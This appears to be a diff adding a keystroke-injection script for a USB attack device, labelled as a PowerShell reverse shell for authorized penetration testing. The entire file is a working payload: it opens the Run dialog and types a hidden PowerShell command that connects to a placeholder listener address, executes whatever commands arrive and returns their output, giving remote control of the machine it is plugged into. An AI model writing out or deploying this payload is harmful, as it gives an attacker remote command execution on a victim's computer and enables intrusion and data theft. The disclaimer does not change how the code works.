@@ -1,0 +1,10 @@
+REM ============================================
+REM PowerShell Reverse Shell
+REM FOR AUTHORIZED PENETRATION TESTING ONLY
+REM ============================================
+REM Replace YOUR_IP and YOUR_PORT with your listener
+
+DELAY 500
+GUI r
+DELAY 200
+STRING powershell -WindowStyle Hidden -NoExit -Command "$c=New-Object System.Net.Sockets.TCPClient('YOUR_IP',YOUR_PORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2='PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2+$r);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"
